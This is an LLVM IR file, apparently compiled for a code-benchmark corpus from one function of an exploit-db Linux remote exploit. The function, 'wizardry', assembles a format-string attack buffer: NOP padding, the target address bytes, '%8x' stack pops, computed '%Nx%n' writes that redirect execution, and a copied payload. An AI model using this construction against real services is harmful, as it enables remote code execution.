; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_wizardry.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_wizardry.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"Target address space contains a poison char\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"malloc()\00", align 1
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%8x\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"%%n%%n\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"%%%dx%%n\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"buffer: %#lx length: %d (+str/+nul)\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"target: %#lx new: %#lx (offset: %d)\0A\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"wiping %d dwords\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @wizardry(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  br label %21

21:                                               ; preds = %25, %5
  %22 = load i32, i32* %7, align 4
  %23 = srem i32 %22, 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %21
  %26 = load i32, i32* %7, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %7, align 4
  br label %21

28:                                               ; preds = %21
  %29 = load i32, i32* %7, align 4
  %30 = load i32, i32* %8, align 4
  %31 = add nsw i32 %29, %30
  %32 = add nsw i32 %31, 4
  store i32 %32, i32* %18, align 4
  %33 = load i32, i32* %18, align 4
  %34 = and i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %15, align 1
  %36 = load i8, i8* %15, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %43, label %39

39:                                               ; preds = %28
  %40 = load i8, i8* %15, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 36
  br i1 %42, label %43, label %48

43:                                               ; preds = %39, %28
  %44 = load i32, i32* @stderr, align 4
  %45 = call i32 @fprintf(i32 %44, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #3
  unreachable

48:                                               ; preds = %39
  store i32 24, i32* %13, align 4
  %49 = load i32, i32* %13, align 4
  %50 = add nsw i32 %49, 1
  %51 = load i32, i32* %8, align 4
  %52 = sub nsw i32 %51, %50
  store i32 %52, i32* %8, align 4
  %53 = load i32, i32* %8, align 4
  %54 = add nsw i32 %53, 1
  %55 = call i8* @malloc(i32 %54)
  store i8* %55, i8** %16, align 8
  %56 = icmp ne i8* %55, null
  br i1 %56, label %61, label %57

57:                                               ; preds = %48
  %58 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %59 = load i32, i32* @EXIT_FAILURE, align 4
  %60 = call i32 @exit(i32 %59) #3
  unreachable

61:                                               ; preds = %48
  %62 = load i8*, i8** %16, align 8
  store i8* %62, i8** %17, align 8
  %63 = load i8*, i8** %17, align 8
  %64 = load i8, i8* @NOP, align 1
  %65 = load i32, i32* %8, align 4
  %66 = call i32 @memset(i8* %63, i8 signext %64, i32 %65)
  store i32 0, i32* %11, align 4
  br label %67

67:                                               ; preds = %95, %61
  %68 = load i32, i32* %11, align 4
  %69 = icmp slt i32 %68, 4
  br i1 %69, label %70, label %100

70:                                               ; preds = %67
  store i32 0, i32* %12, align 4
  br label %71

71:                                               ; preds = %83, %70
  %72 = load i32, i32* %12, align 4
  %73 = icmp slt i32 %72, 4
  br i1 %73, label %74, label %86

74:                                               ; preds = %71
  %75 = load i32, i32* %18, align 4
  %76 = load i32, i32* %12, align 4
  %77 = mul nsw i32 %76, 8
  %78 = ashr i32 %75, %77
  %79 = and i32 %78, 255
  %80 = trunc i32 %79 to i8
  %81 = load i8*, i8** %17, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %17, align 8
  store i8 %80, i8* %81, align 1
  br label %83

83:                                               ; preds = %74
  %84 = load i32, i32* %12, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %12, align 4
  br label %71

86:                                               ; preds = %71
  %87 = load i8*, i8** %17, align 8
  %88 = load i8*, i8** %17, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 -4
  %90 = call i32 @memcpy(i8* %87, i8* %89, i32 4)
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 4
  store i8* %92, i8** %17, align 8
  %93 = load i32, i32* %13, align 4
  %94 = add nsw i32 %93, 8
  store i32 %94, i32* %13, align 4
  br label %95

95:                                               ; preds = %86
  %96 = load i32, i32* %11, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %11, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %18, align 4
  br label %67

100:                                              ; preds = %67
  %101 = load i32, i32* %18, align 4
  %102 = sub nsw i32 %101, 4
  store i32 %102, i32* %18, align 4
  store i32 0, i32* %11, align 4
  br label %103

103:                                              ; preds = %114, %100
  %104 = load i32, i32* %11, align 4
  %105 = load i32, i32* %10, align 4
  %106 = icmp slt i32 %104, %105
  br i1 %106, label %107, label %117

107:                                              ; preds = %103
  %108 = load i8*, i8** %17, align 8
  %109 = call i32 @strncpy(i8* %108, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32 3)
  %110 = load i8*, i8** %17, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 3
  store i8* %111, i8** %17, align 8
  %112 = load i32, i32* %13, align 4
  %113 = add nsw i32 %112, 8
  store i32 %113, i32* %13, align 4
  br label %114

114:                                              ; preds = %107
  %115 = load i32, i32* %11, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %11, align 4
  br label %103

117:                                              ; preds = %103
  %118 = load i32, i32* %7, align 4
  %119 = load i32, i32* %9, align 4
  %120 = add nsw i32 %118, %119
  store i32 %120, i32* %19, align 4
  store i32 0, i32* %11, align 4
  br label %121

121:                                              ; preds = %169, %117
  %122 = load i32, i32* %11, align 4
  %123 = icmp slt i32 %122, 4
  br i1 %123, label %124, label %172

124:                                              ; preds = %121
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %11, align 4
  %127 = mul nsw i32 %126, 8
  %128 = ashr i32 %125, %127
  %129 = and i32 %128, 255
  store i32 %129, i32* %14, align 4
  %130 = load i32, i32* %14, align 4
  %131 = load i32, i32* %13, align 4
  %132 = and i32 %131, 255
  %133 = icmp eq i32 %130, %132
  br i1 %133, label %134, label %139

134:                                              ; preds = %124
  %135 = load i8*, i8** %17, align 8
  %136 = call i32 (i8*, i8*, ...) @sprintf(i8* %135, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %137 = load i8*, i8** %17, align 8
  %138 = getelementptr inbounds i8, i8* %137, i64 4
  store i8* %138, i8** %17, align 8
  br label %169

139:                                              ; preds = %124
  br label %140

140:                                              ; preds = %151, %139
  %141 = load i32, i32* %14, align 4
  %142 = load i32, i32* %13, align 4
  %143 = icmp slt i32 %141, %142
  br i1 %143, label %149, label %144

144:                                              ; preds = %140
  %145 = load i32, i32* %14, align 4
  %146 = load i32, i32* %13, align 4
  %147 = srem i32 %145, %146
  %148 = icmp sle i32 %147, 8
  br label %149

149:                                              ; preds = %144, %140
  %150 = phi i1 [ true, %140 ], [ %148, %144 ]
  br i1 %150, label %151, label %154

151:                                              ; preds = %149
  %152 = load i32, i32* %14, align 4
  %153 = add nsw i32 %152, 256
  store i32 %153, i32* %14, align 4
  br label %140

154:                                              ; preds = %149
  %155 = load i32, i32* %13, align 4
  %156 = load i32, i32* %14, align 4
  %157 = sub nsw i32 %156, %155
  store i32 %157, i32* %14, align 4
  %158 = load i32, i32* %14, align 4
  %159 = load i32, i32* %13, align 4
  %160 = add nsw i32 %159, %158
  store i32 %160, i32* %13, align 4
  %161 = load i8*, i8** %17, align 8
  %162 = load i32, i32* %14, align 4
  %163 = call i32 (i8*, i8*, ...) @sprintf(i8* %161, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %162)
  store i32 %163, i32* %20, align 4
  %164 = load i32, i32* %20, align 4
  %165 = load i8*, i8** %17, align 8
  %166 = sext i32 %164 to i64
  %167 = getelementptr inbounds i8, i8* %165, i64 %166
  store i8* %167, i8** %17, align 8
  br label %168

168:                                              ; preds = %154
  br label %169

169:                                              ; preds = %168, %134
  %170 = load i32, i32* %11, align 4
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %11, align 4
  br label %121

172:                                              ; preds = %121
  %173 = load i8, i8* @NOP, align 1
  %174 = load i8*, i8** %17, align 8
  store i8 %173, i8* %174, align 1
  %175 = load i8*, i8** %16, align 8
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i8, i8* %175, i64 %177
  %179 = load i8*, i8** %6, align 8
  %180 = call i32 @strlen(i8* %179)
  %181 = sext i32 %180 to i64
  %182 = sub i64 0, %181
  %183 = getelementptr inbounds i8, i8* %178, i64 %182
  %184 = load i8*, i8** %6, align 8
  %185 = load i8*, i8** %6, align 8
  %186 = call i32 @strlen(i8* %185)
  %187 = call i32 @memcpy(i8* %183, i8* %184, i32 %186)
  %188 = load i8*, i8** %16, align 8
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8, i8* %188, i64 %190
  store i8 0, i8* %191, align 1
  %192 = load i32, i32* %7, align 4
  %193 = load i8*, i8** %16, align 8
  %194 = call i32 @strlen(i8* %193)
  %195 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i32 %192, i32 %194)
  %196 = load i32, i32* %18, align 4
  %197 = load i32, i32* %19, align 4
  %198 = load i32, i32* %9, align 4
  %199 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i32 %196, i32 %197, i32 %198)
  %200 = load i32, i32* %10, align 4
  %201 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0), i32 %200)
  %202 = load i8*, i8** %16, align 8
  ret i8* %202
}

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
